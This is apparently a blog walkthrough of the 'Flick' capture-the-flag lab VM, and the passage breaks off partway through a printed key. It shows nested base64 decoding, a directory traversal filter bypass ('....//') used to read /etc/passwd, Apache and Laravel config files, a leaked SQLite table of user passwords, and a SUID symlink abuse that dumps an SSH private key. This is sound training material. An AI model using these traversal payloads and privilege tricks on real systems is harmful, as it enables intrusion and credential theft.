<pre><code class="bash">root@pwk:~# echo "Vm0wd2QyUXlVWGxWV0d4V1YwZDRWMVl3WkRSWFJteFZVMjA1VjAxV2JETlhhMk0xVmpKS1IySkVUbGhoTVhCUVZteFZlRll5VGtsalJtaG9UVmhDVVZacVFtRlpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmF6RTFWVEowVjFaWFNraGhSemxWVmpOT00xcFZXbUZrUjA1R1drWndWMDFFUlRGV1ZFb3dWakZhV0ZOcmFHaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVqQTFSMWRyV2xOVWJVcEdZMFZ3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMXdUMVF3TUhoalJscFlZbFZhY2xWcVFURlNNVlY1VFZSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwbGEzQklWbXBHVDJSV1ZuUmhSazVzWWxob1dGWnRNSGhPUm14V1RVaG9XR0pyTlZsWmJGWmhZMnhXYzFWclpGaGlSM1F6VjJ0U1UxWnJNWEpqUm1oV1RXNVNNMVpxU2t0V1ZrcFpXa1p3VjFKV2NIbFdWRUpoVkRKT2RGSnJaRmhpVjNoVVdWUk9RMWRHV25STlZFSlhUV3hHTlZaWE5VOVhSMHBJVld4c1dtSkhhRlJXTUZwVFZqRndSMVJ0ZUdsU2JYY3hWa1phVTFVeFduSk5XRXBxVWxkNGFGVXdhRU5UUmxweFUydGFiRlpzV2xwWGExcDNZa2RGZWxGcmJGZFdNMEpJVmtSS1UxWXhWblZWYlhCVFlrVndWVlp0ZUc5Uk1XUnpWMjVLV0dKSFVtOVVWbHBYVGxaYVdHVkhkR2hpUlhBd1dWVm9UMVp0Um5KT1ZsSlhUVlp3V0ZreFdrdGpiVkpIVld4a2FWSnRPVE5XTW5oWFlqSkZlRmRZWkU1V1ZscFVXV3RrVTFsV1VsWlhiVVpzWWtad2VGVXlkREJXTVZweVYyeHdXbFpXY0hKV1ZFWkxWMVpHY21KR1pGZE5NRXBKVm10U1MxVXhXWGhhU0ZaVllrWktjRlpxVG05V1ZscEhXVE5vYVUxWFVucFdNV2h2V1ZaS1IxTnVRbFZXTTFKNlZHdGFhMk5zV25Sa1JtUnBWbGhDTlZkVVFtRmpNV1IwVTJ0a1dHSlhhR0ZVVmxwM1pXeHJlV1ZIZEd0U2EzQXdXbFZhYTJGV1duSmlla1pYWWxoQ1RGUnJXbEpsUm1SellVWlNhVkp1UWxwV2JYUlhaREZrUjJKSVRtaFNWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm5OWGJGcFhZMGhLV2xaWFVrZGFWV1JQVTBkR1IyRkhiRk5pYTBwMlZtMTBVMU14VVhsVVdHeFZZVEZ3YUZWcVNtOVdSbEpZVGxjNWEySkdjRWhXYlRBMVZXc3hXRlZzYUZkTlYyaDJWakJrUzFkV1ZuSlBWbHBvWVRGd1NWWkhlR0ZaVm1SR1RsWmFVRll5YUZoWldIQlhVMFphY1ZOcVVsWk5WMUl3VlRKMGIyRkdTbk5UYkdoVlZsWndNMVpyV21GalZrcDBaRWQwVjJKclNraFdSM2hoVkRKR1YxTnVVbEJXUlRWWVdWUkdkMkZHV2xWU2ExcHNVbTFTZWxsVldsTmhSVEZaVVc1b1YxWXphSEpaYWtaclVqRldjMkZGT1ZkV1ZGWmFWbGN4TkdReVZrZFdibEpyVWtWS2IxbFljRWRsVmxKelZtMDVXR0pHY0ZoWk1HaExWMnhhV0ZWclpHRldNMmhJV1RJeFMxSXhjRWRhUms1WFYwVktNbFp0Y0VkWlYwVjRWbGhvV0ZkSGFGWlpiWGhoVm14c2NsZHJkR3BTYkZwNFZXMTBNRll4V25OalJXaFhWak5TVEZsVVFYaFNWa3B6Vkd4YVUySkZXWHBXVlZwR1QxWkNVbEJVTUQwPQ==" | base64 -d
Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=
root@pwk:~#
</code></pre>

<p>More base64&hellip; OK, decode again</p>

<pre><code class="bash">echo "Vm0wd2QyUXlVWGxWV0d4V1YwZDRXRmxVU205V01WbDNXa2M1VjJKR2JETlhhMXBQVmxVeFYyTkljRmhoTVhCUVZqQmFZV015U2tWVWJHaG9UVlZ3VlZadGNFZFRNazE1VTJ0V1ZXSkhhRzlVVjNOM1pVWmFkR05GWkZwV01ERTFWVEowVjFaWFNraGhSemxWVm14YU0xWnNXbUZrUjA1R1drWlNUbUpGY0VwV2JURXdZekpHVjFOdVVtaFNlbXhXVm1wT1QwMHhjRlpYYlVaclVqQTFSMVV5TVRSVk1rcFhVMnR3VjJKVVJYZFpla3BIVmpGT2RWVnRhRk5sYlhoWFZtMHhORmxWTUhoWGJrNVlZbFZhY2xWc1VrZFhiR3QzV2tSU1ZrMXJjRmhWTW5SM1ZqSktWVkpZWkZwV1JWcHlWVEJhVDJOdFJrZFhiV3hUWVROQ1dGWnRNVEJXTWxGNVZXNU9XR0pIVWxsWmJHaFRWMFpTVjFwR1RteGlSbXcxVkZaU1UxWnJNWEpqUld4aFUwaENTRlpxU2tabFZsWlpXa1p3YkdFelFrbFdWM0JIVkRKU1YxVnVVbXBTYkVwVVZteG9RMWRzV25KWGJHUm9UVlpXTlZaWGVHdGhiRXAwWVVoT1ZtRnJOVlJXTVZwWFkxWktjbVJHVWxkaVJtOTNWMnhXYjJFeFdYZE5WVlpUWWtkU1lWUlZXbUZsYkZweFUydDBWMVpyV2xwWlZWcHJWVEZLV1ZGcmJGZFdNMEpJVmtSS1UxWXhaSFZVYkZKcFZqTm9WVlpHWTNoaU1XUnpWMWhvWVZKR1NuQlVWM1J6VGtaa2NsWnRkRmRpVlhCNVdUQmFjMWR0U2tkWGJXaGFUVlp3ZWxreWVHdGtSa3AwWlVaa2FWWnJiekZXYlhCTFRrWlJlRmRzYUZSaVJuQlpWbXRXZDFkR2JITmhSVTVZVW14d2VGVnRkREJoYXpGeVRsVnNXbFpXY0hKWlZXUkdaVWRPU0dGR2FHbFNia0p2Vm10U1MxUXlUWGxVYTFwaFVqSm9WRlJYTlc5a2JGcEhWbTA1VWsxWFVsaFdNV2h2VjBkS1dWVnJPVlpoYTFwSVZHeGFZVmRGTlZaUFYyaFhZWHBXU0ZacVNqUlZNV1IwVTJ0b2FGSnNTbGhVVlZwM1ZrWmFjVkp0ZEd0V2JrSkhWR3hhVDJGV1NuUlBWRTVYWVRGd2FGWlVSa1psUm1SellVWlNhRTFZUW5oV1YzaHJZakZrUjFWc2FFOVdWVFZaVlcxNGQyVkdWblJrUkVKb1lYcEdlVlJzVm05WGJGcFhZMGhLV2xaWFVrZGFWM2hIWTIxS1IxcEdaRk5XV0VKMlZtcEdZV0V4VlhoWFdHaFZZbXhhVmxscldrdGpSbFp4VW10MFYxWnNjRWhXVjNSTFlUQXhSVkpzVGxaU2JFWXpWVVpGT1ZCUlBUMD0=" | base64 -d
Vm0wd2QyUXlVWGxWV0d4WFlUSm9WMVl3Wkc5V2JGbDNXa1pPVlUxV2NIcFhhMXBQVjBaYWMySkVUbGhoTVVwVVZtcEdTMk15U2tWVWJHaG9UV3N3ZUZadGNFZFpWMDE1VTJ0V1ZXSkhhRzlVVmxaM1ZsWmFkR05GWkZSTmJFcEpWbTEwYzJGV1NuUmhSemxWVmpOT00xcFZXbUZrUjA1R1UyMTRVMkpXU2twV2JURXdZekpHVjFOdVVtaFNlbXhXVm0xNFlVMHhXbk5YYlVaclVsUkdXbGt3WkRSVk1rcFhVMnR3VjJKVVJYZFpWRVpyVTBaT2NtRkdXbWxTYTNCWFZtMTBWMlF5VW5OWGJHUllZbGhTV0ZSV1pGTmxiRmw1VFZSU1ZrMXJjRWxhU0hCSFZqSkZlVlZZWkZwbGEzQklWV3BHVDJSV1VuUmpSbEpUVmxoQ1dsWnJXbGRoTVZWNVZXeGthbEp0YUhOVmFrNVRWMVpXY1ZKcmRGUldiRm93V2xWb2ExWXdNVVZTYkdSYVRVWmFlbFpxU2t0V1ZrWlpZVVprVTFKWVFrbFdWM0JIVkRKU1YxZHVUbFJpVjNoVVZGY3hiMWRzV1hoYVJGSnBUV3RzTkZkclZtdFdiVXB5WTBac1dtSkdXbWhaTVZwelkyeGtkRkp0ZUZkaVZrbzFWbXBLTkZReFdsaFRiRnBZVmtWd1dGbHNhRU5YUmxweFVtdDBhazFyTlVsWlZWcHJZVWRGZUdOSGFGaGlSbkJvVmtSS1QyTXlUa1phUjJoVFRXNW9kbFpHVm05Uk1XUlhWMWhvV0dKWVVrOVZha1pIVGxaYVdFNVZPV2hXYXpWSFZqSjRVMWR0U2toaFJsSlhUVVp3VkZacVJtdGtWbkJHVGxaT2FWSnRPVE5XYTFwaFZURkZlRmRzYUZSaE1YQnhWV3hrYjFkR1VsaE9WVTVZVW14d2VGVnRkREJoYXpGeVRsVm9XbFpXY0hKWlZXUkdaV3hHY21KR1pGZFNWWEJ2VmpGYWExVXhXWGhVYmxaVllrWktjRlZxUmt0V1ZscEhWV3RLYTAxRVJsTlZSbEYzVUZFOVBRPT0=
root@pwk:~#
</code></pre>

<p><img src="http://d2tq98mqfjyz2l.cloudfront.net/image_cache/1308021750174814.gif" alt="" /></p>

<p>Turns out you have to keep decoding the base64 about 13 more times until you end up with this</p>

<pre><code class="bash">root@pwk:~# echo "dGFidXBKaWV2YXM4S25vag==" | base64 -d
tabupJievas8Knoj
root@pwk:~#
</code></pre>

<p>Which just so happens to be the password for the application runnning on port 8881</p>

<pre><code class="bash">root@pwk:~# nc 192.168.0.106 8881
Welcome to the admin server. A correct password will 'flick' the switch and open a new door:
&gt; tabupJievas8Knoj
OK: tabupJievas8Knoj

Accepted! The door should be open now :poolparty:

&gt; 
</code></pre>

<p>Another NMAP scan now indicates that port 80 is open. Let us take a look.</p>

<hr />

<h2>The Internet is Made of Cats</h2>

<p>Looking at the site hosted by the website kinda stops me in my tracks. KITTENS !!! YAY !!!</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_001.png" alt="flick_001" /></a></p>

<p>You can log in with the credentials of demo:demo123 on the login page to give you the ability to upload images (note here, it allows you to upload absolutely anything).</p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_002.png" alt="flick_002" /></a></p>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_003.png" alt="flick_003" /></a></p>

<p>I figured that the upload feature was the vulnerability and worked on uploading PHP shells etc, but I was not able to get any PHP to execute. Maybe it&rsquo;s not the <strong>up</strong>load feature that&rsquo;s useful, maybe it&rsquo;s the <strong>down</strong>load feature ? The download feature will present you with a file, called image.jpg, of the file you&rsquo;re requesting. Turns out you can request any file on the filesystem if you bypass the directory traversal filter (same way as with Hell, using &hellip;.// instead of ../). Requesting the following</p>

<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/passwd
</code></pre>

<p>results in an &ldquo;image.jpg&rdquo; file which needs to be catted to view the contents of /etc/passwd as text.</p>

<pre><code class="bash">root@pwk:~# mv image.jpg flick_passwd
root@pwk:~# cat flick_passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
landscape:x:104:109::/var/lib/landscape:/bin/false
sshd:x:105:65534::/var/run/sshd:/usr/sbin/nologin
robin:x:1000:1000:robin,,,:/home/robin:/bin/bash
mysql:x:106:114:MySQL Server,,,:/nonexistent:/bin/false
dean:x:1001:1001:,,,:/home/dean:/bin/bash
root@pwk:~#
</code></pre>

<p>Hmm, with this I can request pretty much anything, right ? If a folder or file exists, it gives me a download dialog, if the file does not exist, it gives me an error. This is blind filesystem traversal.</p>

<p><img src="http://media.tumblr.com/tumblr_lg3vooHJ7B1qac925.gif" alt="" /></p>

<p>Firstly I needed to find out the DocumentRoot from the Apache</p>

<p>So, I figured I wanted some credentials - and started by trying to get MySQL credentials from the application. A bit of googling determined that the application was <a href="http://getbootstrap.com/">Bootstrap</a> on top of <a href="https://github.com/laravel/laravel">Laravel</a>.  Firstly I requested the following URL to get the apache configuration.</p>

<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/apache.conf
</code></pre>

<p>which pointed me towards the sites-enabled folder. A bit of googling told me that sites-enabled is just full of symlinks to files in sites-available, so I grabbed the default file</p>

<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//etc/apache2/sites-available/default
</code></pre>

<pre><code class="xml">&lt;VirtualHost *:80&gt;
    ServerAdmin webmaster@localhost

    DocumentRoot /var/www/flick_photos/public
    &lt;Directory /&gt;
        Options FollowSymLinks
        AllowOverride None
    &lt;/Directory&gt;
    &lt;Directory /var/www/flick_photos/public&gt;
        Options Indexes FollowSymLinks MultiViews
        AllowOverride All
        Order allow,deny
        allow from all
    &lt;/Directory&gt;

    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    &lt;Directory "/usr/lib/cgi-bin"&gt;
        AllowOverride None
        Options +ExecCGI -MultiViews +SymLinksIfOwnerMatch
        Order allow,deny
        Allow from all
    &lt;/Directory&gt;

    ErrorLog ${APACHE_LOG_DIR}/error.log

    # Possible values include: debug, info, notice, warn, error, crit,
    # alert, emerg.
    LogLevel warn

    CustomLog ${APACHE_LOG_DIR}/access.log combined

    Alias /doc/ "/usr/share/doc/"
    &lt;Directory "/usr/share/doc/"&gt;
        Options Indexes MultiViews FollowSymLinks
        AllowOverride None
        Order deny,allow
        Deny from all
        Allow from 127.0.0.0/255.0.0.0 ::1/128
    &lt;/Directory&gt;

&lt;/VirtualHost&gt;
</code></pre>

<p>Our DocumentRoot is /var/www/flick_photos/public, so we now know our base path. Using the Laravel github repo as a directional aid, I found out the database config file is located in app/config/database.php, so</p>

<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//....//var/www/flick_photos/app/config/database.php
</code></pre>

<p>catting this image.jpg file does indeed show us credentials for MySQL, but there&rsquo;s something more interesting</p>

<pre><code class="php">&lt;?php

return array(

    /*
    |--------------------------------------------------------------------------
    | PDO Fetch Style
    |--------------------------------------------------------------------------
    |
    | By default, database results will be returned as instances of the PHP
    | stdClass object; however, you may desire to retrieve records in an
    | array format for simplicity. Here you can tweak the fetch style.
    |
    */

    'fetch' =&gt; PDO::FETCH_CLASS,

    /*
    |--------------------------------------------------------------------------
    | Default Database Connection Name
    |--------------------------------------------------------------------------
    |
    | Here you may specify which of the database connections below you wish
    | to use as your default connection for all database work. Of course
    | you may use many connections at once using the Database library.
    |
    */

    // Jan 2014 note: We have moved away from the old crappy SQLite 2.x database and moved
    // on to the new and improved MySQL database. So, I will just comment out this as it is
    // no longer in use

    //'default' =&gt; 'sqlite',
    'default' =&gt; 'mysql',

    /*
    |--------------------------------------------------------------------------
    | Database Connections
    |--------------------------------------------------------------------------
    |
    | Here are each of the database connections setup for your application.
    | Of course, examples of configuring each database platform that is
    | supported by Laravel is shown below to make development simple.
    |
    |
    | All database work in Laravel is done through the PHP PDO facilities
    | so make sure you have the driver for your particular database of
    | choice installed on your machine before you begin development.
    |
    */

    'connections' =&gt; array(

        'sqlite' =&gt; array(
            'driver'   =&gt; 'sqlite',
            'database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
            'prefix'   =&gt; '',
        ),

        'mysql' =&gt; array(
            'driver'    =&gt; 'mysql',
            'host'      =&gt; 'localhost',
            'database'  =&gt; 'flick',
            'username'  =&gt; 'flick',
            'password'  =&gt; 'resuddecNeydmar3',
            'charset'   =&gt; 'utf8',
            'collation' =&gt; 'utf8_unicode_ci',
            'prefix'    =&gt; '',
        ),

        'pgsql' =&gt; array(
            'driver'   =&gt; 'pgsql',
            'host'     =&gt; 'localhost',
            'database' =&gt; 'forge',
            'username' =&gt; 'forge',
            'password' =&gt; '',
            'charset'  =&gt; 'utf8',
            'prefix'   =&gt; '',
            'schema'   =&gt; 'public',
        ),

        'sqlsrv' =&gt; array(
            'driver'   =&gt; 'sqlsrv',
            'host'     =&gt; 'localhost',
            'database' =&gt; 'database',
            'username' =&gt; 'root',
            'password' =&gt; '',
            'prefix'   =&gt; '',
        ),

    ),

    /*
    |--------------------------------------------------------------------------
    | Migration Repository Table
    |--------------------------------------------------------------------------
    |
    | This table keeps track of all the migrations that have already run for
    | your application. Using this information, we can determine which of
    | the migrations on disk haven't actually been run in the database.
    |
    */

    'migrations' =&gt; 'migrations',

    /*
    |--------------------------------------------------------------------------
    | Redis Databases
    |--------------------------------------------------------------------------
    |
    | Redis is an open source, fast, and advanced key-value store that also
    | provides a richer set of commands than a typical key-value systems
    | such as APC or Memcached. Laravel makes it easy to dig right in.
    |
    */

    'redis' =&gt; array(

        'cluster' =&gt; false,

        'default' =&gt; array(
            'host'     =&gt; '127.0.0.1',
            'port'     =&gt; 6379,
            'database' =&gt; 0,
        ),

    ),

);
</code></pre>

<p>This line is what we need to be focusing on</p>

<pre><code class="php">database' =&gt; __DIR__.'/../database/production.sqlite', // OLD DATABASE NO LONGER IN USE!
</code></pre>

<p>which would indicate that the app previously used SQLite, and switched to MySQL. There&rsquo;s a file I need to get my hands on !</p>

<pre><code class="bash">http://192.168.0.106/image/download?filename=....//....//....//....//var/www/flick_photos/app/database/production.sqlite
</code></pre>

<p><a href="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png"><img src="http://fourfourfourfour.co/wp-content/uploads/2014/08/flick_004.png" alt="flick_004" /></a></p>

<p>Yes !  Once I renamed the file and installed SQLite tools onto my Kali VM, I was able to wander around the database to get some username and password combos</p>

<pre><code class="bash">root@pwk:~# mv image.jpg production.sqlite
root@pwk:~# apt-get install sqlite
Blah blah, install blah.
root@pwk:~# sqlite production.sqlite
SQLite version 2.8.17
Enter ".help" for instructions
sqlite&gt; .databases
seq  name             file
---  ---------------  ----------------------------------------------------------
0    main             /root/Downloads/production.sqlite
1    temp             /var/tmp/sqlite_pUdaqDiGqjXzPPF
sqlite&gt; .tables
old_users
sqlite&gt; .dump old_users
BEGIN TRANSACTION;
CREATE TABLE old_users (
  username text,
  password text
);
INSERT INTO old_users VALUES('paul','nejEvOibKugEdof0KebinAw6TogsacPayarkOctIasejbon7Ni7Grocmyalkukvi');
INSERT INTO old_users VALUES('robin','JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1');
INSERT INTO old_users VALUES('james','scujittyukIjwip0zicjoocAnIltAsh4Vuer4osDidsaiWipOkDunipownIrtOb5');
INSERT INTO old_users VALUES('dean','FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA');
COMMIT;
sqlite&gt;
</code></pre>

<p>I know that the users Robin and Dean exist, so I decided to try the above passwords</p>

<pre><code class="bash">root@pwk:~# ssh robin@192.168.0.106

 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o 

robin@192.168.0.106's password: JoofimOwEakpalv4Jijyiat5GloonTojatticEirracksIg4yijovyirtAwUjad1
Permission denied, please try again.
robin@192.168.0.106's password: ^C
root@pwk:~# ssh dean@192.168.0.106

 .o88o. oooo   o8o            oooo
 888 `" `888   `"'            `888
o888oo   888  oooo   .ooooo.   888  oooo
 888     888  `888  d88' `"Y8  888 .8P'
 888     888   888  888        888888.
 888     888   888  888   .o8  888 `88b.
o888o   o888o o888o `Y8bod8P' o888o o888o 

dean@192.168.0.106's password: FumKivcenfodErk0Chezauggyokyait5fojEpCayclEcyaj2heTwef0OlNiphAnA
Welcome to Ubuntu 12.04.4 LTS (GNU/Linux 3.11.0-15-generic x86_64)

 * Documentation:  https://help.ubuntu.com/

  System information as of Wed Aug 13 00:18:03 SAST 2014

  System load:  0.0               Processes:              87
  Usage of /:   39.7% of 6.99GB   Users logged in:        0
  Memory usage: 49%               IP address for eth0:    192.168.0.106
  Swap usage:   1%                IP address for docker0: 172.17.42.1

  Graph this data and manage this system at:
    https://landscape.canonical.com/

79 packages can be updated.
51 updates are security updates.

New release '14.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.

Last login: Wed Aug 13 00:16:41 2014 from 192.168.0.110
dean@flick:~$ 
</code></pre>

<p>OK, we&rsquo;re in. Let the fun continue.</p>

<hr />

<h2>Dean Covers While Robin&rsquo;s on Holiday</h2>

<p>Dean&rsquo;s home folder includes two files - a message text file and a binary called read_docker with the SUID bit set as the robin user.</p>

<pre><code class="bash">dean@flick:~$ ls -l
total 16
-rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
dean@flick:~$ 
</code></pre>

<p>The message file tells us that Robin is away on holiday, and that the admin guys will allow Dean access to his dockerfile in his home directory.</p>

<pre><code class="text">-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Hi Dean,

I will be away on leave for the next few weeks. I have asked the admin guys to
write a quick script that will allow you to read my .dockerfile for flick-
a-photo so that you can continue working in my absense.

The .dockerfile is in my home, so the path for the script will be something like
/home/robin/flick-dev/

Please call me if you have any troubles!

- --
Ciao
Robin
-----BEGIN PGP SIGNATURE-----
Version: GnuPG v1

iQIcBAEBAgAGBQJT32ZsAAoJENRCTh/agc2DTNIP/0+ut1jWzk7VgJlT6tsGB0Ah
yi24i2b+JAVtINzCNgJ+rXUStaAEudTvJDF28b/wZCaFVFoNJ8Q30J03FXo4SRnA
ZW6HZZIGEKdlD10CcXsQrLMRmWZlBDQnCm4+EMOvavS1uU9gVvcaYhnow6uwZlwR
enf71LvtS1h0+PrFgSIoItBI4/lx7BiYY9o3hJyaQWkmAZsZLWQpJtROe8wsxb1l
9o4jCJrADeJBsYM+xLExsXaEobHfKtRtsM+eipHXIWIH+l+xTi8Y1/XIlgEHCelU
jUg+Hswq6SEch+1T5B+9EPoeiLT8Oi2Rc9QePSZ3n0fe4f3WJ47lEYGLLEUrKNG/
AFLSPnxHTVpHNO72KJSae0cG+jpj1OKf3ErjdTk1PMJy75ntQCrgtnGnp9xvpk0b
0xg6cESLGNkrqDGopsN/mgi6+2WKtUuO5ycwVXFImY3XYl+QVZgd/Ntpu4ZjyZUT
lxqCAk/G1s43s+ySFKSoHZ8c/CuOKTsyn6uwI3NxBZPD04xfzoc0/R/UpIpUmneK
q9LddBQK4vxPab8i4GNDiMp+KXyfByO864PtKQnCRkGQewanxoN0lmjB/0eKhkmf
Yer1sBmumWjjxR8TBY3cVRMH93zpIIwqxRNOG6bnnSVzzza5DJuNssppCmXLOUL9
nZAuFXkGFu6cMMD4rDXQ
=2moZ
-----END PGP SIGNATURE-----
</code></pre>

<p>Looks like they tried to be clever and made the binary instead. So, what does this binary do ? It seems to just read any file called &ldquo;dockerfile&rdquo; from the directory you provide.</p>

<pre><code class="bash">dean@flick:~$ ./read_docker /home/robin
ERROR: the specified docker file doesn't exist: /home/robin/Dockerfile
Usage is: ./read_docker /path/to/dockerfile
dean@flick:~$ ./read_docker /home/robin/flick-dev
# Flick-a-photo dev env
RUN apt-get update &amp;&amp; apt-get install -y php5 libapache2-mod-php5 php5-mysql php5-cli &amp;&amp; apt-get clean &amp;&amp; rm -rf /var/lib/apt/lists/*

CMD ["/usr/sbin/apache2", "-D", "FOREGROUND"]
dean@flick:~$ 
</code></pre>

<p>After messing around reading files I created in varying directories, I decided to fool the application into reading a symlink to an arbitrary file on the filesystem - my first attempt was /home/robin/.ssh/id_rsa. Might as well start somewhere, right ? I was fully expecting this to fail, as I had no idea if the target file actually existed.</p>

<pre><code class="bash">dean@flick:~$ ln -s /home/robin/.ssh/id_rsa /home/dean/Dockerfile
dean@flick:~$ ls -l
total 16
lrwxrwxrwx 1 dean  dean    23 Aug 11 23:10 Dockerfile -&gt; /home/robin/.ssh/id_rsa
-rw-r--r-- 1 root  root  1250 Aug  4 12:56 message.txt
-rwsr-xr-x 1 robin robin 8987 Aug  4 14:45 read_docker
dean@flick:~$ ./read_docker ./
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAlv/0uKdHFQ4oT06Kp3yg0tL1fFVl4H+iS1UOqds0HrgBCTSw
ECwVwhrIFJa/u5FOPGst8t35CKo4VWX3KNHXFNVtUXWeQFpe/rB/0wi+k8E8WtXi
FBjLiFOqTDL0kgXRoQzUPlYg0+LAXo5EbMq+rB2ZgMJTxunJFV2m+uKtbZZRvzU6
S1Fj6XHh/U0E68d6sZ/+y1UhSJLaFYUQMkfLtjxPa17sPZ+kwB1R4puhVTprfQOk
CinfW01ot2Rj2HLMR5CpgA28dmxw8W6w0MGtXurTegj1ydFOTgB1/k4XpXnSGNO9
d2AlVR/NsKDAuYKdgRGFFh91nGZTl1p4em48YwIDAQABAoIBADI3bwhVwSL0cV1m
jmAC520VcURnFhlh+PQ6lkTQvHWW1elc10yZjKbfxzhppdvYB/+52S8SuPYzvcZQ
wbCWkIPCMrfLeNSH+V2UDv58wvxaYBsJVEVAtbdhs5nhvEovmzaHELKmbAZrO3R2
tbTEfEK7GUij176oExKC8bwv1GND/qQBwLtEJj/YVJSsdvrwroCde+/oJHJ76ix4
Ty8sY5rhKYih875Gx+7IZNPSDn45RsnlORm8fd5EGLML6Vm3iLfwkHIxRdj9DFoJ
wJcPX7ZWTsmyJLwoHe3XKklz2KW185hIr9M2blMgrPC2ZuTnvBXmEWuy86+xxAB0
mFXYMdkCgYEAx6yab3huUTgTwReaVpysUEqy4c5nBLKqs6eRjVyC9jchQfOqo5AQ
l8bd6Xdrk0lvXnVkZK0vw2zwqlk8N/vnZjfWnCa4unnv2CZXS9DLaeU6gRgRQFBI
